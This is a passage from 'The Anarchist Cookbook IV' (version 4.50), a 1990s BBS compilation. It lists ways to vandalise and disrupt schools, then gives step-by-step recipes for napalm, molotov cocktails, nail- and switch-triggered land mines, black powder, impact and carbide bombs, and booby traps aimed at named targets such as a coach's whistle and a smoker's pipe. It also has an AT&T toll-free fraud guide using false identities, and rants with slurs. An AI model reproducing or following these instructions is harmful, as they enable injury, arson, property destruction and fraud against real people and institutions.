ALL DIFFERENT AND, REASONABLY ENOUGH, ALL BLOW DIFFERENTLY (SOME ARE MORE
POWERFUL, ALTHOUGH I HAVE NOT TRIED ALL 56).  SOME REQUIRE MORE CARE THAN
OTHERS TOO.  SECONDLY, YOU MAY NOT HAVE ALL THE MATERIALS FOR ONE, BUT YOU
MIGHT HAVE ALL YOU NEED FOR THE ANOTHER.

                         More School Terrorism



     About 20 of these ideas were first printed in 1967 by some high school
kids in America's industrial heartland.  They were most recently used in
England after the riots there in 1982.  Since those first 20, several (80, to
be exact) have been added by various people and groups.  You can look at the
title window yourself.  Some interesting ideas have been lost over phone
transmissions, etc., but for the most part every way we can think of is here.
Most were reprinted from the 'School Stoppers Textbook', a small section of the
'How to Revolt Handbook', the fourth book of 'The Blacklisted News', available
for 13 bucks from the Youth International Party (Yippies).  Keep in mind that
the writers and distributors of this text assume no responsibility for the
actions taken by our readers; these are simple suggestions only.  Anyway, here
we go . . . our list of 100 ways to trash your school.


---------------
WHAT YOU CAN DO
---------------
(1)  Get a syringe (minus needle) or similar device.  Mix both tubes of epoxy
glue with a little rubbing alcohol.  You now have about half an hour to fill
locks, door jambs, soap dispensers, drinking fountain nozzles, video tapes,
etc., before glue hardens.  This glue can also be placed on the outside of
doorknobs and tops of chairs for a sticky surprise.  If you can't get the epoxy
glue and syringe, a tube of airplane cement can also be used although it is not
as permanent.
(9)  In gym classes or in hallways between classes have massive searches for
'lost' contact lenses telling people not to walk through the hall or 'you might
step on it'.  Pretending you've lost something is good cover for all kinds of
subversive behavior.
(10)  Buy some little metal number plates and switch around classroom and
locker numbers.  This works very well if you can find number plates that look
exactly the same as the old ones.
(12)  Free all the animals in the biology classroom.
(14)  Periodically have students go to the office to have some rumor confirmed
or denied.
(23)  Swallow some snake bite antidote then walk into the principal's office.
The antidote (most types are harmless -- make sure you get that kind) will make
you vomit.  Do so all over his carpet, desk, clothing, etc. then apologize
profusely.
(25)  Remove contents of teacher's mailboxes.  Print up everything that's
confidential or interesting.  'Borrow' any special notices that may be found
sitting on their desks like lists of excused people, etc. (as long as you're
not on them).
(29)  If your school has a suspended ceiling (a ceiling composed of rectangles
or squares resting on a frame so that the rectangles can be pushed up) you can
put a dead fish -- or anything else -- above them.  Or put it into empty
lockers and glue them shut.
(31)  Give your school library a subscription to a good underground newspaper
from your area and insist that they make it available to students.
(32)  Print up false notices frequently using the same format as the school
uses and distribute them to the teachers' mailboxes.  Eventually they'll never
know what to believe.
(39)  Get hold of a film to be shown at a school assembly and splice in parts
of another movie of your own choosing before the assembly.  A little
imagination on your part will make for an unforgettable day.
(47)  Create the 'WEB OF THREAD' in your classroom.  Have everybody in your
class bring a spool of thread--with extras for people who forget.  Tie your
thread onto something and pass the spools around till you run out, winding
thread around everything.  (It is best to pick on one of your more dullwitted
teachers for this one).  Explain that you did it in the name of art.
(50)  Ride a bicycle (not your own) down a busy hall.
(51)  Save your book reports and essays.  Give them to other students to use
next year or re-use them yourself with different teachers.
(52)  Play with lighting and microphone controls during 'important' assemblies.
(53)  Flush things down the toilets (preferably faculty johns) like balloons
filled with air, baseballs, M80's, huge amounts of toilet paper, etc.  Then
build an ark.
(59)  During some important test (SAT/ACT/etc.) on each subject have some
student who is good at that subject stand up and read the correct answers for
as long as possible.  When they're finished or silenced have someone else stand
up and do the same thing.  The test results will be worthless and it will have
to be given over at great cost to the school.
(60)  Take down the American flag in front of the school and put up one of your
own.  The best way to do this is to lower the flag that's already up, replace
it with your flag, and cut the rope about a foot below where the flag is
attached.  Then tie a slip knot around the other end of the rope that is
hanging down to raise the flag.  At this point there is no way your flag can be
lowered without someone climbing up the flagpole.
(61)  Take signs off office doors (ones that say 'principal' or 'private') and
switch them around with the ones on bathrooms.  Or just switch the 'men' and
'women' signs before too many people know their way around.  This can make for
some good laughs.
(62)  Put alarm clocks in various lockers set on 'loudest'.  Set the alarm
clocks so they will go off about every 10 minutes then close and lock the
lockers.
(64)  In a class where there is a rule against chewing gum have everyone blow a
bubble at the same time one day.
(65)  On a Monday morning, try turning around all the desks, including the
teacher's, before the teacher arrives.  Act completely normal and it will
usually take the teacher about 10 minutes to figure out what is wrong.
(66)  Many schools have automatic sprinkler systems which go off automatically
when sensors in the ceiling feel too much heat.  Find the sensors and hold up
a match to them.
(67)  Persuade the graduating class to use their senior gift money for
something useful or subversive.
(75)  Steal cafeteria trays or plates, burn large holes in them, and turn them
into the school washer saying 'I guess the food did it'.
(76)  Leave phony letters of resignation from teachers or administrators on the
principal's desk.
(77)  Get a small group to always carry screwdrivers and slowly dismantle the
school.
(78)  Always carry around a small magnet that you can use to erase any kind of
magnetic media--cassette tapes, video tapes, and especially computer grading
disks.
(80)  Photograph teachers and administrators constantly--even without film.
(81)  If you've got the nerve, piss in your pants while giving an oral report.
(82)  Splice into your school's intercom system (from a remote hidden spot).
Now you have your own guerilla radio station.  Play on!
(85)  Call up your local newspaper or TV or radio station and tell them about
what a good Samaritan your worst teacher is.  Tell them how he does community
service and helps out old people and you think he deserves some credit.
Hopefully you can persuade them to do an article and interview.
(86)  Newspaper stands in buildings are usually left unguarded.  Take out
papers and replace with rotten comics or papers.
(90)  Tape-record the stupidest lectures from your principal and later walk by
them while playing the recording and laugh.  Another idea would be to edit it
yourself and recreate sentences so that the official is saying something he/she
never intended.  Then widely distribute the tape.
(91)  Take the door of the administration offices off its hinges but leave it
standing there so that when the principal tries to open the door in the morning
it will have a slightly crushing effect.
(92)  Pretend to have food poisoning after lunch break.  Get lots of people to
join in.  Roll on the floor, or get sick by pushing your fingers down your
throat.  With luck you can start general panic.
(98)  Test out the methods for cheating on Scan-tron tests (see 'Mastering the
Scan-tron' by Ivanhoe and The Warhead) and then modify the article for your
particular school system and distribute it a few days before major exams.
(100)  If there is any trouble in getting any of the above to work, simply talk
a few people into having fake decoy fights to attract the administrators'
attention so you'll have time to put your plan into operation.....

          ===========> The Man-Tooth <============
          ============== SHIT BOMB ===============
          ==============> Classic <===============

     Here is another nice little trap for the crude of the bombers.

 Materials:                   Source:

 1)Fresh feces(a.k.a. SHIT)   1)Backyard, public restrooms, basement.
      (looser the better).
 2)M80.                       2)Black market or your neighbor.
 3)Large baggie.              3)Kitchen.
 4)Lightbulb.                 4)Victim's ceiling.
 5)Solar ignitor (optional).  5)Hobby shop, rocket engine package.


-- more --          Instructions:

     Put the fresh feces in a large baggie.  Gently break the covering of a
large wattage lightbulb, but DO NOT disturb the filament inside.  More gently
still, attach the fuse of the M80 to the filament and screw the lightbulb
carefully back into the ceiling socket.  Finally, move the bag of feces up and
around the light fixture.  Make sure the shit does not touch the filament, and
the M80 should should be well into the 'feces'.  Tape the bag to the ceiling.
If the filament breaks, or if you prefer, a solar ignitor can be used to replace
the filament.  This could take more time though due to the process of attaching
the ignitor to the 2 wires to complete a circuit.

MAKE SURE THE LIGHT IS TURNED OFF BEFORE REPLACING THE BULB!!!

     If not...you have about 4 seconds to run your ass off!

When the victim turns on the light switch.....well, let's just say:

               "The shit's gonna hit the fan."
               (and probably everything else!)


               "Have f-f-f-phun....dammit!"

Napalm
------
        Mix gasoline with dish washing detergent (Ivory Soap) untill the
        solution is like honey. Use it in a bottle with a rag as molotov
        cocktail or paint it on something and light it. It will burn alot
        longer than regular gas.

Land Mine #1
------------
        Take a soup can and line the inside with Petroleum jelly (enough so
        you won't have air between the cup and can. Place a  Styrofoam cup
        inside the can and f)lU it with gasoline. Cover the soup can with a
        sheet of Aluminum foil and tape it down so it is air tight. Place can
        in a freezer over night. Dig a small hole in the ground and place the
        can in it foil side up. Cover it up with with dirt about one inch
        thick. Carefully place a nail in the dirt (don't break the foil!).
        When someone steps on the nail and pierces the foil, the mine will
        go off and so will their foot.

Land Mine #2
------------
        Get a push button switch. Take the wires and connect one end to a
        9 volt battery connecter and the other to a Solar Igniter. Connect
        the other wire of the battery to the other wire on the solar igniter.
        Connect the solar igniter to the fuse of one of your favorite bombs
        (M-80, pipe bomb, etc.). Dig a hole, not too deep, but enough to
        cover up the whole thing. Plant the switch under a leaf or something
        and plant the bomb about 5 feet away. When the person steps on the
        switch, there should be a 3 second delay, then it will blow.

Black Powder
------------
        Place 5 pints of alcohol in a bucket. In another bucket, put 3 cups
        of granulated potassium nitrate, 2 cups powdered wood charcoal, and
        1/2 cup of powdered sulfur into the bucket. Add 1 cup of water and
        stir well with a wooden stick. Place the bucket on a heat source and
        add 2 more cups of water and wait for it to bubble but don't let it
        boil. Remove the bucket from the heat and pour it into the alcohol
        while stirring well. Let the alcohol stand for about 5 minutes. Strain
        the liquid through cheesecloth to remove the powder. Wrap the cloth
        around the powder and squeeze out the excess liquid. Place a piece
        of screen on top of a bucket. Place a workable amount of black powder
        (That black muddy looking stuff) on the screen and begin to workd it
        through. Spread the end result on a piece of newspaper and let it dry
        in the sunlight. Now you have black powder which can be used to make
        other bombs.

Impact Bomb
-----------
        Mix solid Nitric Iodine with househould ammonia. Wait overnight
        and pour off the liquid. You will be left with a muddy substance.
        Let it dry untill it hardens up. To use it, put it in a bottle or
        can and just drop it or throw it at something.

Carbide Bomb
------------
        This is EXTREMELY DANGEROUS. Exercise extreme caution....
        Obtain some calcium carbide. This stuff can be found at nearly any
        hardware store. Take a few pieces of this stuff (it looks like gravel)
        and put it in a glass jar with some water. Cover the jar tightly. The
        carbide will react with the water to produce acetylene carbonate which
        is similar to the gas used in cutting torches. Eventually the glass
        with explode from internal pressure. If you leave a burning rag
        nearby, you will get a nice fireball.

Exhaust Bomb
------------
        Install a spark plug into the last four or five inches of the tail
        pipe by drilling a hole that the plug can screw into easily.
        Attach a wire (this is regular insulated wire) to one side of the
        switch and to the spark plug. The other side of the switch is attached
        to the positive terminal on the battery. With the car running, simply
        hit the switch and watch the flames.

Turn Signal
-----------
        Detach the plastic running light (or turn signal) cover on someones
        car.  Break the bulb.  Test the bulb with a voltage meter to make sure
        it is not live. Pack the bulb with Flash Paper and replace the cover.
        When the person starts his car or goes to turn, a quick burst of flame
        will pop out of the back of his car making him think it is on fire.


Winger
------
        This is the ultimate in assault devices. It is a large, three person
        sling-shot designed for hurling water baloons up to 100 yards. They
        are supposed to leave the sling-shot at 240mph but through personal
        experience, I've gotten some to go at least 150-200 yards. As for the
        speed, I don't know. These are good for launching almost anything
        that is not motion sensitive. You can get them at some boat shops
        (that's where I got mine), or you can order them from:

                Winger Sports LTD.
                2167 Buhl Avenue
                North St. Paul Minnesota  55109

Classics no matter how old...

        With World War III knocking on our door, I feel it is every persons
right to be able to protect and defend his or her's investments. With the
Government making it almost impossible for the average person to have a decent
weapon, I guess that only means that you will have to make them yourself. So,
I've come back with a few more ideas, both serious and prank.

Fire Grenade Launcher
---------------------

        First, you will need a 12 or 16 gauge shotgun. You must mount two
      T=ygs to it and make it like a tripod with the stock being the third
        leg. Take a shell and hacksaw off the front part with the shot in
        it. Place the modified shell in the chamber. Take a long piece of
        circular wood (like a broomstick) and shove it in through the barell.
        Make sure it is at least touching the shell (don't push too hard
        unless you want a broomstick through your head!). Next, mount a
        small rubber platform on the end of the stick. Securely fasten a
        molotov cocktail the the platform (coke bottle filled with gas,
        oil, detergent, and an oily rag in the top). Light the rag and pull
        the trigger. With practice, you can shoot this thing wih amazing
        accuracy.


Explosive Ideas
---------------

        Everyone has made a bomb and just lit it and watched it go boom.
        there are ways to get more out of your boom. If you take something
        like sandbags or bags of cement and lay them on top or on the sides
        of your bomb, the result will be much more damaging and will create
        a smoke screen (if you use something like cement or flour and not
        rocks or sand).


Itching Powder
--------------

        I know this is no Anarchy, but ideas are running low. This, however,
        makes a great practical joke! Get some fiberglass insulation (either
        by punching a hole in your wall and removing it, or by going to a
        construction sight and lifting it). Grind it up good (for large
        amounts, I suggest something like a blender). Now just place this
        pink powder anywhere you wish. This is better than the stuff you can
        buy in the store. I got some asshole in the movies and he itched
        all throughout the show. Don't ask me why I had itching powder in
        the movies, but it did work.


Rain Detination
---------------

        Here's an easy way to let mother nature help you set off a few bombs
        (they must be ELECTRICAL). If it's raining out, place 2 test leads
        into a cup (or 2 wires), each on opposite sides, so that they are
        touching the bottom of the cup. Next place some metalic substance
        (that DOES conduct electricity) in the bottom (not too much! Don't
        connect the wires!). Wire up your favorite bomb around this leaving
        the only break in the circuit in the bottom of the cup. When it rains
        enough, the water will begin to fill cup, mix with the metal, and act
        as a bridge for the electricity. If all was set up correctly, your
        device should go off. In the event of no rain, just use one of those
        Solar Cells (obtainable from Radio Shack) and connect it to a solar
        igniter (this must be a FIRE type bomb with a fuse!). Connect the
        igniter to the fuse, set the bomb in a shady place (that is soon
        to be in the light), and leave. All should go as planned.


Whistler Bomb
-------------

        Do you have one of those asshole coaches in your school always
        blowing that damn whistle at you? If so, here's an idea that will
        shut his ass up for a while. First, make a small batch of your
        favorite friction sensitive explosive (see early "Terrorist Home
        Companion" files written by me and a few other aRu members). Fill
        his whistle up with it (not a whole bunch or he'll notice. Just enough
        so it will make a boom he will never forget. Now, go be an asshole on
        the field and wait for his to give it a good blow. "Gee coach, how did
        you get shrapnel in your face?"


Exploding Pipe
--------------

        So you have that asshole teacher or mean old man on the block who
        smokes a (cough, cough) pipe. Or maybe even your favorite weedhead.
        Steal the guys pipe (like from his car). If it is a good pipe, you
        should be able to pull it into 2 pieces. Clean it out (with a pipe
        cleaner, they're cheap). Run a fuse from the bowl back to where the
        pipe goes back together. Place a small explosive inside the tube
        where the smoke comes through to the mouth and wire it up to the
        fuse. Next, replace the burnt tobacco that was in the bowl and put
        it back where you got it from. "What's wrong, not getting enough
        drag? Maybe you should suck harder. Boom!"

 A ACBIV 4.50 Exclusive! You all wanted to know, sooo:


HOW TO GET AN 800# SO ALL THE PHREAKS CAN CALL THE BEST
BBS'S IN THE WORLD AND AT&T PAYS FOR IT
-------------------------------------------------------

This article is written by Tesla.  It is in response to
the filing of Federal Criminal Case #93-133 in the 
US DISTRICT COURT OF WESTERN PA "USA vs. Keith Maydak,
et al"  While Keith Maydak does not condone of this message, 
it is necessary for AT&T to know where we stand.  These 
files are the response of the lies and scams that AT&T
perpetrates throughout the country.  It's time for hackers
to take back the telephone system and give it to nice 
carriers like MCI, Cable & Wireless, LCI Intl', RCI, and
all the small companies trying to compete with that 
$73,000,000,000 former monopoly.  They are playing with
your parents' money.

Please distribute this article everywhere.  You may add
any notes to the end, but please do not remove this 
notice.  

Soon, very powerful files will be released that will 
result in the bankruptcy of AT&T.  

-------------------------------------------------------
So, wouldn't it be kool if the hacker board in your
area had toll-free service?  Wouldn't it be kool if it
costed AT&T nearly 8 cents per minute of fees they
had to pay BELL for the calls to it.  Wouldn't it be kool
if all the attempts produced millions of incomplete calls
'cuz all the hackers and phreaks set their auto-dialers
to call it.  

First, open up a magazine.  See all those post-cards inside.
Get one that has a nice PO BOX.  Keep that address handy.
Now, open up the telephone yellow pages.  Pick out a medium
sized company.  Something not too big, not too small.

Get their address and phone number.  Now, get the phone 
number to the best BBS.  Call the operator and get 
the city and state it's located in.  Now, call XXX-555-1212
and get the number for the closest AT&T office in that
area.

1.  Call the AT&T office in the area and write down the address.

2.  Go to a payphone or block your ANI and dial 1-800-222-0400.

    Tell the nice lady that you wanted to get an 800#.  Save time,
    say, "I wanted the Readyline Service, I know all about it."

    She'll ask you some information.  Here's the response:
    YOUR NAME:  Any name.  Make one up. 
    NAME OF COMPANY:  You use the name from the phone book
    BILLING ADDRESS:  Give the PO BOX of the post-card.  
    SERVICE ADDRESS:  Give the address of the AT&T office near
                      the BBS
    PHONE NUMBER TO ROUTE THE 800#:  THE BBS NUMBER
    YOUR CONTACT #:  USE A # THAT DOESN'T ANSWER OR IS BUSY OR
                     A PAY TELEPHONE
    Credit info:         (they only sometimes ask)
      TYPE OF COMPANY:  CORPORATION
      PRESIDENT'S NAME:  MAKE ONE UP
      WHEN STARTED:  Anywhere from 1956 to 1985
      ANNUAL SALES:  $150,000 - $2.3MM

    Ask her to assign the number while you are on the telephone. 
    Tell her you need it ASAP.  It'll be up in a day or so.
    
AFTER THE NUMBER IS WORKING, POST IT ON EVERY BBS IN TOWN.  MAKE SURE
HUNDREDS OF PEOPLE USE IT.  

AT&T will not harrass the callers of the 800#.  If the BBS is like
a multi-line system, the bill will be very high.  SO, don't tell 
the SYSOP you did it 'cuz AT&T may try to contact him.  He won't get
in trouble, but some people are assholes and will narc.  Since this
is a kool way to phreak, don't blow it.

ALSO, consider getting 800#'s for compuserve, prodigy, telenet, etc...
all those things that rack up message units.  Give the numbers out.
Millions of hackers will use them to log on creating $50-60,000 bills
for AT&T to eat the loss.  
--------------------------------------------------------

  AT&T:  Another part of the I-SCAM

  Why, when they were broken up for being an illegal monopoly, why
  were they able to keep all their assets.  Shouldn't they have been
  given back to the people they stole from?  Our parents.  WE WANT OUR
  MONEY BACK AND WE WANT IT TODAY.

                        REAL 28.8 Connection EVERYTIME!



   When you first got your 28.8 Modem, you Probably thought that you were
 going to connect at 28800 Evertime... Well, soon you found out that you
 were WRONG!, and you would connect at 21600, or 24600, or 24000. But this
 IS fixable, and not difficult even if you know nothing at all about your
 Computer/Modem.

   First of all, To get things straight. a V.34 protocol on your modem is
 Definently Safer, but not Faster, its negotiations are a bit on the Too
 Damn Safe Side :). So What we are first going to do is get the modem OUT
 of v.34 Mode, and into the Faster BUT not safer v.fc Mode (You allways have
 to sacrafice something ya know :). The next thing we are going to have to
 do is Disable Negotiations, so that your modem will will "Fight" there
 way to 28.8 Baud.

   NOTE: Some Stuborn USR's Still wont let you conenct 28.8 But 26.4, Which
         Still A Hell of alot faster than 21.6!!

   And The Last thing we have to do is set the modems Connect Baud rate to
 Minumum 28800, and Maximum 28800., If you Cant connect when you do this
 then Try Minumum 26400, Max 28800. and that Should Solve It.

   Now your Probably Wondering, "Well, How in the Fuck do you expect me to
 know How to set all that up!?!?", Well, Im gonna Tell Ya..




    AT+MS=74,0,28800,28800      or    AT+MS=74,0,26400,28800

  Ok, the first Number, 74, Tells it to go into V.FC (V Fast Class) Mode.
 the Second Number (0), Tells it to NOT NEGOTIATE ANYTHING else, BUT your
 specified 28800/28800.. (Or if you have to use the second, 26400/28800)
 AND Your last two numbers are yout Minimum 28800, Max 28800..

  This Will cause you to connect at 28800..

   I get a steady 3160Cps!! when connected at 28800. on a Line that I usually
  can only connect at 21600 with CPS 2000!...

  I have onlye Tested this on My ZOOM 28.8 v34/ Vfc Modem. So Dont Yell at me
if it dont work with yout Piece of SHit.. :)..

  So, Try:

AT+MS=74,0,28800,28800

and If that wont connect, then

AT+MS=74,0,26400,28800

(Just Type it in at the Terminal)

  Q: "But WHAT DO i Do when I want to go BACK to Normal!"

  A: "Type AT+MS=11,1,300,28800"
-------------------------------------------------------------

  Q: "You dont know How the Fuck to write Doc's Do you.. "

  A: "NO SHIT!, Well, Write me Mail :)"

                                                 Headphone.....

  Who has the time or effort to remember all these acronyms that people require
 you  to know  when you're  applying for  membership  on an elite board?  I can
 understand the  fact that we  want to keep  lamers out but  most of the groups
 using  those acronyms are not  that popular  and most  people don't  know them
 anyway  yet  they  expect  others to.  Here is a list  of over 125 of the most 
 common acronyms  asked on New User Application  forms. It has now been revised

 The OLD conclusion..

                           ** CONCLUSION **


Well, thats it! The Anarchist CookBook IV, release version 4.14.  It 
has taken a little over a year to compile all these files from 
dozens of anarchy books and filez.  I even gave up my board, The 
Black Gate, and my modeming to compile this offline.  There have 
been several release versions that were never really released into 
the public.  It seemed everytime I was ready to release it, I got 
more stuff to put in it.  I finally stopped changing ver. ## and 
left it at 4.14, in memory and salute of the 414's, who until they 
were caught, were the BEST HaCkinG and PhreAKiNg group out there.  
My hat goes off to the Jolly Roger for his inspiration, and to the 
editors of The Big Book Of Mischief, without whom there would be no 
references.  The release date of The Anarchist CookBook IV is June, 
1994.  Well, now that I'm done, my board will go back up, and I will 
begin the distribution.  But for those who are impatient for it to 
get to them, it is available straight off The Black Gate BBS.  Until 
then, Thanx for your dedication to the HaCkiNG and PhrEaKIng world.
Exodus and The Black Gate BBS are available to the Tri-State area, 
and I will be calling boards in the North Jersey area ONLY.  If you 
can't get in touch with me at my board, call around the 201 exchange.
I should be around a board or two.  L8r.. and Thanx for the Support!





                  The NEW conclusion: 4.50, 1995


 Well, I changed my handle, as you can see..  to Mondain, mainly because
 some little punk asshole, shit for brains, mutherfucker, dumbass, momma's
 boy, stupid, dickless, PiECE OF SHiT named raji, yea das right, -STOLE-
 my handle, and rode off my reputation, along with his parents money, and 
 started a board, using MY references, and contacts..  If you encounter this
 asshole, please, know that I'm not using the Exodus handle anymore, fuckin
 BLACKLIST him!. Just about everyone I know in NJ, and even further HATES 
 this faggot, and wants him out of the scene, which he knows absolutely 
 NOTHING about.  So, for my sake, be a DICK towards him..  His beatdown
 is on its way..  And the new revision release version is 4.50.  Changes
 include updated drawings, and chemical recipes.  Added a LOT really since
 4.14, and ACB is still, the BEST CooKBooK in the USA. The biggest, and the
 most popular.  The Black Gate has closed Temporarily due to the major SHIT
 going on in the scene, but you can read TBG-DOWN.ZIP for that..  So remember,
 support your software dealers <... > and buy software that you like, but, 
 first get in on the Scene and test it out <heh heh..>.  As you see in 4.50,
 uSu - united States underground - has contributed much to the new CB. I 
 thank Cyberglitch for his help with the leech accounts on several boards to
 help download all this shit from all over. =)  Please, PLEASE read the files
 in TBG-DOWN.ZIP.  It's not just about how my board went down, but it also 
 talks about the Scene, and how we MUST save it SOON, or the shit will hit the
 fan.  In the subsequent files in TBG-DOWN.ZIP, are shout-outs, bashes, and
 group greetz.  I appreciate the download of The Anarchist's CookBook 4.50,

 PS - The Anarchist's Cookbook 4.14 was -THE- most WIDELY CIRCULATED 
 Anarchist's Cookbook EVER!!  Thats EVER, as in in HISTORY!  I would like
 to thank all those who traded the ACB to boards in Europe, Puerto Rico, 
 Africa, South America, Austrailia, and Canada!  Thanks, and I have no doubt
 that version 4.50 will travel just as far, and farther! Peace.
